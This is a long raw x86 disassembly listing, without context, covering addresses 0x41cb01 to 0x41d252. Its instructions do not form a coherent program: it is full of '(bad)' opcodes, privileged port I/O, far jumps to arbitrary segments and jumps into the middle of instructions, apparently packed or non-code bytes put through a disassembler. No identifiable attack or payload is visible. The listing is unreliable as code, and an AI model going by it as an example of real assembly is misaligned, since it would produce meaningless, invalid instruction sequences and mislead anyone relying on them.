  41cb01:	retf   0x8b88
  41cb04:	mov    edi,0x56211550
  41cb09:	inc    edi
  41cb0a:	jne    0x41caf2
  41cb0c:	call   0x54c58d04
  41cb11:	scas   al,BYTE PTR es:[edi]
  41cb12:	pop    ss
  41cb13:	sub    DWORD PTR [esi],ecx
  41cb15:	xchg   ebx,eax
  41cb16:	fs sub eax,0xcf6f8851
  41cb1c:	push   ebp
  41cb1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb1e:	mov    bl,0xda
  41cb20:	inc    ecx
  41cb21:	cmc    
  41cb22:	inc    ebp
  41cb23:	and    DWORD PTR [edi-0x54],esp
  41cb26:	push   0x55522cb5
  41cb2b:	test   dl,cl
  41cb2d:	and    BYTE PTR [ebp+0x17],ch
  41cb30:	add    edx,DWORD PTR [eax+0x2d]
  41cb33:	jmp    0xee1787b
  41cb38:	pop    eax
  41cb39:	mov    ch,0xf9
  41cb3b:	ins    DWORD PTR es:[edi],dx
  41cb3c:	aam    0xa0
  41cb3e:	test   al,0x88
  41cb40:	call   0xb4e6:0x5c9d10
  41cb47:	dec    ebx
  41cb48:	push   cs
  41cb49:	push   esp
  41cb4a:	dec    ebx
  41cb4b:	push   ds
  41cb4c:	jmp    0x41cb9d
  41cb4e:	push   es
  41cb4f:	xchg   esp,eax
  41cb50:	in     al,dx
  41cb51:	push   0x1fdd8636
  41cb56:	and    dl,al
  41cb58:	mov    es,WORD PTR ds:0xa5c68b3e
  41cb5e:	push   eax
  41cb5f:	or     al,0x7d
  41cb61:	mov    eax,esi
  41cb63:	xchg   ebp,eax
  41cb64:	add    eax,0x3103c99d
  41cb69:	jnp    0x41cb9a
  41cb6b:	or     al,0x3b
  41cb6d:	adc    ebp,DWORD PTR [eax+0x52]
  41cb70:	mov    al,0x3
  41cb72:	xor    dl,BYTE PTR [ecx]
  41cb74:	xchg   BYTE PTR [esp+esi*8-0x60],ch
  41cb78:	push   eax
  41cb79:	loope  0x41cb0f
  41cb7b:	pop    ds
  41cb7c:	repz imul ecx,eax,0xbcd26141
  41cb83:	mov    al,BYTE PTR [ebx+0x60]
  41cb86:	inc    ebp
  41cb87:	jmp    0x41cc07
  41cb89:	inc    esi
  41cb8a:	fwait
  41cb8b:	dec    ecx
  41cb8c:	addr16 jmp 0x7d0:0x26b60441
  41cb94:	loopne 0x41cb48
  41cb96:	sub    edi,DWORD PTR [ebx+ebx*8+0x46]
  41cb9a:	push   ebp
  41cb9b:	sti    
  41cb9c:	jbe    0x41cc0b
  41cb9e:	dec    eax
  41cb9f:	shr    BYTE PTR [esi],0xa8
  41cba2:	cmp    ch,dh
  41cba4:	cmp    al,0x8f
  41cba6:	loopne 0x41cc26
  41cba8:	cmc    
  41cba9:	das    
  41cbaa:	jle    0x41cc1b
  41cbac:	test   al,0x14
  41cbae:	pop    ecx
  41cbaf:	push   DWORD PTR [esi]
  41cbb1:	adc    DWORD PTR ds:0xbc4903ab,ebp
  41cbb8:	and    al,0xde
  41cbba:	ss sub eax,0xd97f56eb
  41cbc0:	lods   al,BYTE PTR ds:[esi]
  41cbc1:	enter  0xa81f,0xef
  41cbc5:	sar    DWORD PTR [edi-0x4a018efd],cl
  41cbcb:	fild   QWORD PTR [ebp+0x1d2f237]
  41cbd1:	mov    esp,0x18afe4a1
  41cbd6:	push   esi
  41cbd7:	ds gs jl 0x41cb7d
  41cbdb:	retf   0xad3e
  41cbde:	ficom  DWORD PTR [ecx-0x11b8e038]
  41cbe4:	rcl    ch,cl
  41cbe6:	pop    es
  41cbe7:	inc    BYTE PTR [edx+0x5e]
  41cbea:	shl    BYTE PTR [esi-0x4d9c0cea],1
  41cbf0:	aam    0x68
  41cbf2:	dec    eax
  41cbf3:	out    dx,al
  41cbf4:	cmp    cl,0xdb
  41cbf7:	add    DWORD PTR [edx],0x8c55464d
  41cbfd:	idiv   BYTE PTR [eax+edi*1]
  41cc00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc01:	pop    esi
  41cc02:	fs test al,0xd6
  41cc05:	mov    ch,0x20
  41cc07:	push   ebp
  41cc08:	cwde   
  41cc09:	dec    esi
  41cc0a:	cdq    
  41cc0b:	je     0x41cc07
  41cc0d:	shl    BYTE PTR [ecx],1
  41cc0f:	pop    ecx
  41cc10:	daa    
  41cc11:	jae    0x41cc5a
  41cc13:	xchg   edx,eax
  41cc14:	repnz push esp
  41cc16:	aam    0x80
  41cc18:	mov    bl,0x5c
  41cc1a:	jg     0x41cc12
  41cc1c:	iret   
  41cc1d:	sbb    eax,ecx
  41cc1f:	call   0xedeaafdc
  41cc24:	sahf   
  41cc25:	push   DWORD PTR [esi+0x48aa257e]
  41cc2b:	(bad)  
  41cc2c:	stos   DWORD PTR es:[edi],eax
  41cc2d:	cld    
  41cc2e:	mov    BYTE PTR [edi-0x4a],al
  41cc31:	jo     0x41cc97
  41cc33:	mov    ds:0x5c863ea7,al
  41cc38:	js     0x41ccb7
  41cc3a:	xchg   ch,al
  41cc3c:	sbb    esi,0xd9d1358a
  41cc42:	mov    esp,0x8ea9eea6
  41cc47:	push   0x97620d40
  41cc4c:	cmp    esi,DWORD PTR [edi-0xc]
  41cc4f:	sbb    edi,ebp
  41cc51:	xor    cl,cl
  41cc53:	mov    bh,0x59
  41cc55:	or     BYTE PTR [edi-0x27],ah
  41cc58:	push   cs
  41cc59:	sbb    BYTE PTR ds:0x34418431,cl
  41cc5f:	mul    BYTE PTR [eax+eiz*8]
  41cc62:	bound  edx,QWORD PTR [ebx]
  41cc64:	push   0xffffff82
  41cc66:	push   ebp
  41cc67:	adc    bl,dh
  41cc69:	(bad)  
  41cc6a:	(bad)  
  41cc6b:	or     BYTE PTR [edx+0x14c3d621],0xe9
  41cc72:	pop    edi
  41cc73:	dec    esi
  41cc74:	push   es
  41cc75:	push   0x9bdb3cb
  41cc7a:	stos   BYTE PTR es:[edi],al
  41cc7b:	adc    BYTE PTR [eax],ch
  41cc7d:	cmc    
  41cc7e:	jns    0x41cc50
  41cc80:	lds    edi,FWORD PTR [edx-0x61e3c70d]
  41cc86:	pusha  
  41cc87:	mov    bh,0x43
  41cc89:	ds jmp 0xd52d:0xf7250b11
  41cc91:	inc    esp
  41cc92:	and    al,0x76
  41cc94:	adc    ah,BYTE PTR [edx+ecx*2]
  41cc97:	mov    dh,0xd1
  41cc99:	out    0xf4,al
  41cc9b:	jle    0x41cc5e
  41cc9d:	xor    eax,0x8ca0be63
  41cca2:	or     esp,DWORD PTR [ebx-0x5014d8cd]
  41cca8:	or     bl,BYTE PTR [edi-0x6ef90a37]
  41ccae:	imul   edi,DWORD PTR [edx-0x4d4bdd2e],0x50
  41ccb5:	xor    eax,0xbd9025b1
  41ccba:	popa   
  41ccbb:	sub    ebx,DWORD PTR [ebx]
  41ccbd:	inc    edi
  41ccbe:	xchg   ebp,eax
  41ccbf:	cmp    BYTE PTR [edx+0x78e603ce],dl
  41ccc5:	out    0x93,eax
  41ccc7:	inc    edx
  41ccc8:	jbe    0x41cc99
  41ccca:	add    DWORD PTR [esi+0x18a39adf],ebx
  41ccd0:	inc    DWORD PTR [eax-0x7d5ebb64]
  41ccd6:	clc    
  41ccd7:	les    ebp,FWORD PTR [edi]
  41ccd9:	push   ds
  41ccda:	pop    ebp
  41ccdb:	test   BYTE PTR [ecx+0x2048b35a],0x29
  41cce2:	std    
  41cce3:	(bad)  
  41cce4:	sar    ecx,1
  41cce6:	inc    eax
  41cce7:	je     0x41ccc3
  41cce9:	sbb    ch,BYTE PTR [ecx+0x2f]
  41ccec:	mov    eax,0x2567036c
  41ccf1:	mov    bl,0x6a
  41ccf3:	mov    bl,0x90
  41ccf5:	addr16 jg 0x41ccd9
  41ccf8:	xchg   BYTE PTR [ecx-0x62],cl
  41ccfb:	leave  
  41ccfc:	imul   ecx,DWORD PTR [esi+0x5a],0xffffffe3
  41cd00:	popa   
  41cd01:	xor    DWORD PTR [ebp-0x6a],edx
  41cd04:	loop   0x41cd3d
  41cd06:	fs sub al,0xb7
  41cd09:	aam    0x99
  41cd0b:	lds    esp,FWORD PTR [ecx-0x6237e509]
  41cd11:	aam    0x26
  41cd13:	jge    0x41cd80
  41cd15:	mov    esi,ds
  41cd17:	mov    ah,0xf1
  41cd19:	jecxz  0x41cd2d
  41cd1b:	dec    ebx
  41cd1c:	mov    al,0xb6
  41cd1e:	(bad)  
  41cd1f:	push   ss
  41cd20:	push   cs
  41cd21:	inc    DWORD PTR [edx+esi*8]
  41cd24:	pop    edx
  41cd25:	or     ah,BYTE PTR [edi]
  41cd27:	sub    al,0xed
  41cd29:	mov    bl,0xe2
  41cd2b:	ja     0x41ccf3
  41cd2d:	fild   WORD PTR [edi+0x4]
  41cd30:	add    al,BYTE PTR [ecx+eax*4-0x7c9f25d4]
  41cd37:	pop    ebx
  41cd38:	jo     0x41cd84
  41cd3a:	aam    0x62
  41cd3c:	nop
  41cd3d:	loopne 0x41cd09
  41cd3f:	pop    ebx
  41cd40:	in     al,0x98
  41cd42:	repz dec edx
  41cd45:	(bad)  
  41cd46:	jmp    0x58b2:0xdd3ab086
  41cd4d:	jmp    0x41cda1
  41cd4f:	std    
  41cd50:	add    bh,BYTE PTR [ebx-0x53534caa]
  41cd56:	cwde   
  41cd57:	dec    ecx
  41cd58:	push   ds
  41cd59:	xor    eax,0x5b554f5
  41cd5e:	mov    ss,WORD PTR ds:0xdd228c13
  41cd64:	outs   dx,DWORD PTR ds:[esi]
  41cd65:	in     eax,dx
  41cd66:	dec    esp
  41cd67:	dec    ecx
  41cd68:	ins    BYTE PTR es:[edi],dx
  41cd69:	pop    edx
  41cd6a:	pop    ecx
  41cd6b:	jp     0x41cddf
  41cd6d:	mov    eax,esi
  41cd6f:	or     esi,DWORD PTR [esi+0x641bbe9d]
  41cd75:	mov    WORD PTR [ebx],?
  41cd77:	pusha  
  41cd78:	mov    ch,0xa
  41cd7a:	inc    ebp
  41cd7b:	sbb    al,0x21
  41cd7d:	mov    ch,0x63
  41cd7f:	in     al,dx
  41cd80:	xor    dl,BYTE PTR [ebx+0x2f448188]
  41cd86:	mov    al,ds:0x363a36ca
  41cd8b:	in     al,0x71
  41cd8d:	cmp    ah,BYTE PTR [ebx+ebx*8]
  41cd90:	fbld   TBYTE PTR [ebp+0x2a48e50d]
  41cd96:	iret   
  41cd97:	or     ch,bl
  41cd99:	arpl   WORD PTR [edi],bp
  41cd9b:	jp     0x41cd97
  41cd9d:	mov    ebx,0x77ef5375
  41cda2:	(bad)
  41cda6:	mov    bh,0x75
  41cda8:	out    0xd9,eax
  41cdaa:	xchg   BYTE PTR [ebx+0x4bfd4dbd],dl
  41cdb0:	xchg   DWORD PTR [eax+0x19],edi
  41cdb3:	push   edi
  41cdb4:	dec    edx
  41cdb5:	push   0xc408db3a
  41cdba:	scas   eax,DWORD PTR es:[edi]
  41cdbb:	ficomp WORD PTR [edx+0x4]
  41cdbe:	fisttp DWORD PTR [ebx-0x2dddc61e]
  41cdc4:	add    BYTE PTR [edx+0x67],bh
  41cdc7:	cmp    bh,ah
  41cdc9:	aad    0xe2
  41cdcb:	mov    al,ds:0x2c032f4c
  41cdd0:	out    0x53,al
  41cdd2:	lea    ecx,[ebp+0x4b]
  41cdd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdd6:	mov    ecx,0x137cd1c7
  41cddb:	push   eax
  41cddc:	fisttp WORD PTR [eax+ebp*1]
  41cddf:	adc    dh,BYTE PTR [ebx+0x65]
  41cde2:	push   eax
  41cde3:	popf   
  41cde4:	add    eax,esi
  41cde6:	mov    DWORD PTR [ecx-0x16],esp
  41cde9:	and    eax,0xc3c8eafb
  41cdee:	jne    0x41cdf8
  41cdf0:	mov    esi,0x5abb4ddd
  41cdf5:	and    al,0xb3
  41cdf7:	sub    BYTE PTR [ebp-0x72],dl
  41cdfa:	cwde   
  41cdfb:	inc    eax
  41cdfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdfd:	fwait
  41cdfe:	and    dh,0x9e
  41ce01:	out    0xd4,al
  41ce03:	mov    ch,0xd3
  41ce05:	jle    0x41cdd9
  41ce07:	cmp    dl,BYTE PTR [ebx+ebp*2]
  41ce0a:	xor    al,0xa7
  41ce0c:	into   
  41ce0d:	cmp    BYTE PTR [eax+0x6854fc42],0xac
  41ce14:	mov    al,ds:0x3625398e
  41ce19:	pop    esp
  41ce1a:	vmread DWORD PTR [ebp+0x2b],ebx
  41ce1e:	add    bl,BYTE PTR [esi]
  41ce20:	sub    eax,0x51169c8d
  41ce25:	mov    eax,0x893cdc82
  41ce2a:	push   esp
  41ce2b:	shr    ch,0x61
  41ce2e:	aam    0xc1
  41ce30:	dec    ebp
  41ce31:	lods   al,BYTE PTR ds:[esi]
  41ce32:	push   ds
  41ce33:	sub    BYTE PTR [edi+0x527d7373],ch
  41ce39:	add    esp,DWORD PTR [edx]
  41ce3b:	push   esi
  41ce3c:	push   ebx
  41ce3d:	mov    dl,0x6f
  41ce3f:	sbb    esi,DWORD PTR [ebx+0x75]
  41ce42:	push   es
  41ce43:	(bad)  [edx]
  41ce45:	mov    ecx,0xd740b036
  41ce4a:	pop    ss
  41ce4b:	mov    eax,0x24fb0f43
  41ce50:	lods   eax,DWORD PTR ds:[esi]
  41ce51:	rol    DWORD PTR [ebp+0x6b],0xfc
  41ce55:	dec    edi
  41ce56:	dec    edx
  41ce57:	add    BYTE PTR [ebp+0x7e83a116],0x14
  41ce5e:	js     0x41cdfa
  41ce60:	add    BYTE PTR [eax-0x1b],0x5
  41ce64:	shr    BYTE PTR [esi+0x62],0x31
  41ce68:	sbb    BYTE PTR [esi],bl
  41ce6a:	mov    ah,0xf0
  41ce6c:	xchg   esi,eax
  41ce6d:	xchg   BYTE PTR [edi-0x5e],dh
  41ce70:	sub    eax,0x8b5047c2
  41ce75:	mov    ?,WORD PTR [edx]
  41ce77:	inc    edi
  41ce78:	loope  0x41cedb
  41ce7a:	nop
  41ce7b:	fidivr DWORD PTR [eax+0x57]
  41ce7e:	mov    esp,0x9c255c7
  41ce83:	adc    esi,DWORD PTR [esi+0x3aad50ee]
  41ce89:	jmp    0x49214f05
  41ce8e:	xchg   ebx,eax
  41ce8f:	lea    ebp,[ebp-0x1d]
  41ce92:	jo     0x41cec9
  41ce94:	retf   
  41ce95:	cld    
  41ce96:	sbb    ecx,DWORD PTR [esi]
  41ce98:	add    eax,0x74d4294a
  41ce9d:	sbb    al,0x3
  41ce9f:	test   DWORD PTR [eax-0x7a],eax
  41cea2:	jmp    0x3c2c680a
  41cea7:	test   al,0x18
  41cea9:	or     esi,DWORD PTR [edx-0x4ee3c7f]
  41ceaf:	push   ds
  41ceb0:	mov    ah,0xae
  41ceb2:	sub    eax,0x52667355
  41ceb7:	adc    BYTE PTR [ecx+0x76],bl
  41ceba:	jns    0x41cf37
  41cebc:	psraw  mm5,QWORD PTR [eax-0x15]
  41cec0:	sbb    dh,BYTE PTR [ebp+eax*8-0x3a]
  41cec4:	push   esi
  41cec5:	xchg   ebp,eax
  41cec6:	shr    BYTE PTR [edx],cl
  41cec8:	push   esp
  41cec9:	and    eax,DWORD PTR [edi]
  41cecb:	pop    esi
  41cecc:	rcr    bl,cl
  41cece:	xchg   esp,eax
  41cecf:	pop    ss
  41ced0:	jbe    0x41cf3f
  41ced2:	outs   dx,BYTE PTR ds:[esi]
  41ced3:	push   ss
  41ced4:	arpl   WORD PTR [ebx-0x7d087819],di
  41ceda:	iret   
  41cedb:	mov    edx,0xef5c382f
  41cee0:	cli    
  41cee1:	add    ah,BYTE PTR [ebp+esi*1-0x3f68f6ad]
  41cee8:	ins    DWORD PTR es:[edi],dx
  41cee9:	mov    WORD PTR [esi],ss
  41ceeb:	xor    ch,BYTE PTR [esi]
  41ceed:	scas   eax,DWORD PTR es:[edi]
  41ceee:	pop    ds
  41ceef:	dec    eax
  41cef0:	push   cs
  41cef1:	lods   eax,DWORD PTR ds:[esi]
  41cef2:	shl    DWORD PTR ds:0x6c7c0fcd,1
  41cef8:	push   ds
  41cef9:	and    BYTE PTR [ebx],0xe0
  41cefc:	mov    dh,BYTE PTR [edi-0x2]
  41ceff:	or     eax,DWORD PTR [eax+0x37]
  41cf02:	(bad)  
  41cf03:	jecxz  0x41ceea
  41cf05:	loopne 0x41cf73
  41cf07:	(bad)  
  41cf09:	xchg   edi,eax
  41cf0a:	pusha  
  41cf0b:	clc    
  41cf0c:	inc    eax
  41cf0d:	ret    
  41cf0e:	mov    DWORD PTR [ecx+esi*1],ebp
  41cf11:	push   esi
  41cf12:	pop    ebp
  41cf13:	pop    ecx
  41cf14:	add    eax,0xac6b872
  41cf19:	xor    esp,DWORD PTR [esi]
  41cf1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf1c:	jmp    0x41cf70
  41cf1e:	clc    
  41cf1f:	test   al,0xd1
  41cf21:	daa    
  41cf22:	add    dh,al
  41cf24:	ror    DWORD PTR [edx],1
  41cf26:	cld    
  41cf27:	xchg   esp,eax
  41cf28:	xchg   esp,eax
  41cf29:	je     0x41cf81
  41cf2b:	sbb    al,0xde
  41cf2d:	(bad)  
  41cf2f:	jmp    0x337d:0x35fcf4b2
  41cf36:	push   ss
  41cf37:	add    esp,DWORD PTR [ebp+0x4d43ed6]
  41cf3d:	dec    esp
  41cf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf3f:	mov    esi,0xa3187dca
  41cf44:	cld    
  41cf45:	pop    es
  41cf46:	out    0x9a,al
  41cf48:	ds sti 
  41cf4a:	fistp  QWORD PTR [eax+0x6]
  41cf4d:	pop    ss
  41cf4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf4f:	dec    edx
  41cf50:	xor    al,0xf
  41cf52:	push   cs
  41cf53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf54:	mov    ax,0x4dfb
  41cf58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf59:	mov    ch,0x61
  41cf5b:	fidiv  DWORD PTR [esi-0x553f820a]
  41cf61:	pop    esp
  41cf62:	test   DWORD PTR [ebx+0x5ae97262],edi
  41cf68:	jle    0x41cf12
  41cf6a:	adc    ecx,DWORD PTR [esi+ebx*1]
  41cf6d:	fimul  WORD PTR [ebp+0x36]
  41cf70:	cmp    eax,0xd063a8b6
  41cf75:	mov    edx,0x470c3fdc
  41cf7a:	imul   BYTE PTR [ebx+eax*1+0x36e8ce1b]
  41cf81:	(bad)  
  41cf82:	retf   
  41cf83:	sbb    bl,BYTE PTR [ecx+ebx*1-0x5ddc61e6]
  41cf8a:	sub    al,0x9
  41cf8c:	das    
  41cf8d:	or     edx,DWORD PTR [eax-0x49192284]
  41cf93:	inc    ebx
  41cf94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf95:	popf   
  41cf96:	mov    ds,WORD PTR [eax]
  41cf98:	lock xchg esp,eax
  41cf9a:	sub    DWORD PTR [edi-0x569880e2],ebx
  41cfa0:	jmp    0x41cfe7
  41cfa2:	jns    0x41cf28
  41cfa4:	and    eax,0xbda1b545
  41cfa9:	push   cs
  41cfaa:	les    ebx,FWORD PTR [ecx]
  41cfac:	push   eax
  41cfad:	imul   ecx,DWORD PTR [ecx+0x209e1d99],0xf149466
  41cfb7:	push   edi
  41cfb8:	repnz test al,0xe8
  41cfbb:	jmp    0xce1c:0x1095eb4b
  41cfc2:	push   es
  41cfc3:	cmp    al,0x1
  41cfc5:	enter  0x76bb,0xae
  41cfc9:	shl    BYTE PTR [esi-0x74],cl
  41cfcc:	fwait
  41cfcd:	js     0x41cfaf
  41cfcf:	fadd   DWORD PTR [esi+0x2]
  41cfd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfd3:	jnp    0x41cf81
  41cfd5:	xchg   ebp,eax
  41cfd6:	lahf   
  41cfd7:	call   0x25bded90
  41cfdc:	popf   
  41cfdd:	mov    ds:0xeda24459,al
  41cfe2:	(bad)  
  41cfe3:	mov    cl,0x6c
  41cfe5:	sbb    al,0x7f
  41cfe7:	mov    ds:0x38de63a,eax
  41cfec:	inc    ebx
  41cfed:	jmp    FWORD PTR [ecx*2+0x5bf7c754]
  41cff4:	or     al,0xb
  41cff6:	dec    ebx
  41cff7:	in     al,dx
  41cff8:	jae    0x41d056
  41cffa:	adc    DWORD PTR [esi+0x6],0x61
  41cffe:	sbb    BYTE PTR [eax+0x64],dl
  41d001:	dec    ebx
  41d002:	mov    ebp,0x4da58de2
  41d007:	sahf   
  41d008:	ret    
  41d009:	or     edx,ebx
  41d00b:	(bad)  
  41d00c:	jl     0x41d04d
  41d00e:	cmp    al,0x38
  41d010:	jne    0x41cf9f
  41d012:	mov    dh,0x88
  41d014:	retf   0x4035
  41d017:	xchg   dl,al
  41d019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d01a:	cmp    esp,DWORD PTR [edx+eiz*8]
  41d01d:	iret   
  41d01e:	sub    BYTE PTR [edx+0x1e],bh
  41d021:	pushf  
  41d022:	or     al,0xe4
  41d024:	mov    ecx,0x4c4fcd32
  41d029:	pop    ecx
  41d02a:	push   ss
  41d02b:	jmp    0x41d061
  41d02d:	mov    ebp,0x95ce2f20
  41d032:	sahf   
  41d033:	stos   BYTE PTR es:[edi],al
  41d034:	xor    eax,0x71455c46
  41d039:	cmc    
  41d03a:	es stos BYTE PTR es:[edi],al
  41d03c:	jne    0x41d019
  41d03e:	(bad)  
  41d03f:	(bad)  
  41d041:	and    ecx,DWORD PTR [esi-0x57]
  41d044:	sahf   
  41d045:	and    DWORD PTR ds:0x187f50b8,ecx
  41d04b:	add    eax,0x8be99d0
  41d050:	sub    bl,BYTE PTR [ecx]
  41d052:	cwde   
  41d053:	dec    ebp
  41d054:	mov    ecx,0x4bc4bf9d
  41d059:	outs   dx,DWORD PTR ds:[esi]
  41d05a:	xor    DWORD PTR [ecx+ecx*2+0x2c81c17a],eax
  41d061:	xchg   ebp,eax
  41d062:	arpl   bx,si
  41d064:	leave  
  41d065:	test   al,0x1c
  41d067:	retf   0xc94
  41d06a:	jg     0x41d0bc
  41d06c:	sbb    eax,0x3324d10a
  41d071:	mov    esp,esp
  41d073:	inc    ebp
  41d074:	mov    dl,0x8
  41d076:	out    0x15,al
  41d078:	rcl    DWORD PTR [eax-0x3a],cl
  41d07b:	enter  0x590e,0xe1
  41d07f:	dec    ecx
  41d080:	ficom  WORD PTR [ebx+edx*1-0x2a]
  41d084:	scas   al,BYTE PTR es:[edi]
  41d085:	mov    ebp,0xb1e549fc
  41d08a:	stc    
  41d08b:	popf   
  41d08c:	lds    edx,FWORD PTR [edx+0x75]
  41d08f:	fcom   QWORD PTR [edx]
  41d091:	jbe    0x41d0c1
  41d093:	hlt    
  41d094:	mov    ebx,0xd64a9661
  41d099:	into   
  41d09a:	push   ecx
  41d09b:	xlat   BYTE PTR fs:[ebx]
  41d09d:	stc    
  41d09e:	mov    eax,ds:0x4bc390c4
  41d0a3:	pusha  
  41d0a4:	adc    ch,dh
  41d0a6:	inc    ecx
  41d0a7:	shl    DWORD PTR [ecx-0x5eef2cdf],1
  41d0ad:	aaa    
  41d0ae:	pop    esp
  41d0af:	dec    edx
  41d0b0:	arpl   WORD PTR [edi+0x6a],si
  41d0b3:	dec    esp
  41d0b4:	sub    al,0x92
  41d0b6:	(bad)  
  41d0b7:	fld    QWORD PTR ds:0x5af3d105
  41d0bd:	(bad)  
  41d0be:	ins    BYTE PTR es:[edi],dx
  41d0bf:	in     eax,dx
  41d0c0:	ins    DWORD PTR es:[edi],dx
  41d0c1:	or     BYTE PTR [eax],ah
  41d0c3:	loope  0x41d082
  41d0c5:	dec    ebx
  41d0c6:	jle    0x41d13c
  41d0c8:	and    ebx,DWORD PTR [ebx+0x52]
  41d0cb:	test   BYTE PTR [edx-0x3167596e],ah
  41d0d1:	loop   0x41d0e3
  41d0d3:	sbb    ebx,DWORD PTR [ebx+0x56]
  41d0d6:	add    BYTE PTR [ecx+0x75],bl
  41d0d9:	bound  edx,QWORD PTR [eax+edi*8+0x39]
  41d0dd:	inc    edi
  41d0de:	call   0xccbb2779
  41d0e3:	call   0xdaed:0xd1dd3087
  41d0ea:	in     al,dx
  41d0eb:	fs inc ecx
  41d0ed:	fdiv   QWORD PTR ds:0x6a73a316
  41d0f3:	rol    DWORD PTR [eax+0x61721a5b],cl
  41d0f9:	mov    si,0x5acc
  41d0fd:	adc    BYTE PTR [edi],0x4b
  41d100:	clc    
  41d101:	adc    bl,BYTE PTR [ecx-0x60bc51bc]
  41d107:	or     al,BYTE PTR [edi+0x28]
  41d10a:	dec    edi
  41d10b:	mov    ebp,0x79d71af3
  41d110:	push   edi
  41d111:	pop    ds
  41d112:	(bad)  
  41d113:	inc    DWORD PTR [ebx+eiz*2+0x1a3910b5]
  41d11a:	add    DWORD PTR [edx-0x42],ebx
  41d11d:	(bad)  
  41d11f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d120:	jo     0x41d12d
  41d122:	sbb    al,0xe9
  41d124:	call   FWORD PTR [ebp+0x6f]
  41d127:	push   ds
  41d128:	pop    ebp
  41d129:	stc    
  41d12a:	fs pop ebp
  41d12c:	(bad)  
  41d12d:	push   ss
  41d12e:	push   edi
  41d12f:	das    
  41d130:	cdq    
  41d131:	and    ch,al
  41d133:	or     DWORD PTR [ebx-0x7a5cbe85],edi
  41d139:	mov    edi,0x675a315a
  41d13e:	add    eax,0x328ae391
  41d143:	loope  0x41d11f
  41d145:	retf   
  41d146:	dec    esp
  41d147:	cmp    ebp,ecx
  41d149:	xchg   esi,eax
  41d14a:	inc    esi
  41d14b:	jecxz  0x41d17e
  41d14d:	or     DWORD PTR [edi+0x3b01111e],ebp
  41d153:	sbb    DWORD PTR [ebx+0x3e31afdb],ecx
  41d159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d15a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d15c:	mov    al,ds:0xd4e02e1b
  41d161:	xchg   ebp,eax
  41d162:	dec    ebp
  41d163:	xchg   esp,eax
  41d164:	aad    0x8e
  41d166:	ret    
  41d167:	add    BYTE PTR [ebp-0x2e],0x59
  41d16b:	adc    eax,0x52a37a86
  41d170:	neg    BYTE PTR [ebp+0x5b]
  41d173:	jbe    0x41d1a0
  41d175:	(bad)  
  41d176:	mov    ds:0xc76d5b35,al
  41d17b:	push   0xb71af678
  41d180:	xor    DWORD PTR [eax-0x58],0xffffffbd
  41d184:	cli    
  41d185:	addr16 jle 0x41d1d4
  41d188:	mov    eax,ds:0x3ecd535d
  41d18d:	xchg   esi,eax
  41d18e:	pop    esi
  41d18f:	lahf   
  41d190:	loope  0x41d20d
  41d192:	jae    0x41d161
  41d194:	data16 or BYTE PTR [ebx-0x38d3c7f],bh
  41d19b:	test   eax,0xb535f6dd
  41d1a0:	add    bh,BYTE PTR [ebx+0x1c]
  41d1a3:	xchg   ebp,eax
  41d1a4:	add    bl,dh
  41d1a6:	cmp    al,0x84
  41d1a8:	sub    eax,0xec22b917
  41d1ad:	lock adc al,al
  41d1b0:	scas   eax,DWORD PTR es:[edi]
  41d1b1:	lea    edx,[edi+edi*8-0x6a]
  41d1b5:	rcr    BYTE PTR [edx+0x115d9175],1
  41d1bb:	ret    
  41d1bc:	cmp    DWORD PTR [ecx],edx
  41d1be:	or     dl,bl
  41d1c0:	pop    ebx
  41d1c1:	mov    ebx,0x17b9d4d6
  41d1c6:	loop   0x41d152
  41d1c8:	cmp    ebx,DWORD PTR [eax]
  41d1ca:	push   eax
  41d1cb:	or     BYTE PTR [ebp-0x63f5a05d],ah
  41d1d1:	cdq    
  41d1d2:	cmp    eax,DWORD PTR [esi+eax*1]
  41d1d5:	test   al,0xf7
  41d1d7:	mov    bl,BYTE PTR ds:[eax-0x5df25090]
  41d1de:	sub    ah,BYTE PTR [ecx]
  41d1e0:	rcr    ah,1
  41d1e2:	lds    eax,FWORD PTR [ecx-0x40]
  41d1e5:	cmpps  xmm5,XMMWORD PTR [ebp+0x1f],0x45
  41d1ea:	mov    ds:0x7275f2b0,eax
  41d1ef:	jl     0x41d237
  41d1f1:	inc    ebp
  41d1f2:	mov    eax,ds:0xef279f61
  41d1f7:	xlat   BYTE PTR ss:[ebx]
  41d1f9:	xchg   esi,eax
  41d1fa:	or     DWORD PTR [edx],edi
  41d1fc:	or     eax,0x78d2b5a3
  41d201:	mov    ecx,0x1e617f22
  41d206:	repnz sbb ebx,esp
  41d209:	add    BYTE PTR [edx],ah
  41d20b:	push   eax
  41d20c:	pop    esi
  41d20d:	fimul  DWORD PTR [eax+0x18]
  41d210:	or     ebx,ebx
  41d212:	sbb    al,0x5
  41d214:	dec    eax
  41d215:	enter  0x3021,0x2
  41d219:	xchg   ebp,eax
  41d21a:	ffree  st(2)
  41d21c:	stc    
  41d21d:	pop    edx
  41d21e:	jno    0x41d1bb
  41d220:	popf   
  41d221:	(bad)  
  41d222:	sbb    ecx,ebx
  41d224:	push   edx
  41d225:	ret    0x1c1
  41d228:	call   0xb41a:0xb8ee932c
  41d22f:	add    DWORD PTR [edi+0x78],edx
  41d232:	push   ebp
  41d233:	pop    edx
  41d234:	add    ebp,DWORD PTR es:[edi]
  41d237:	in     al,0x81
  41d239:	and    eax,0x3add0d33
  41d23e:	fldcw  WORD PTR [eax-0xe]
  41d241:	jecxz  0x41d2bc
  41d243:	dec    eax
  41d244:	mov    WORD PTR [ecx+0x27],ss
  41d247:	dec    ecx
  41d248:	loop   0x41d2a7
  41d24a:	test   eax,0xc7a2ee1d
  41d24f:	je     0x41d1fd
  41d251:	dec    edx
  41d252:	mov    bl,0x9f
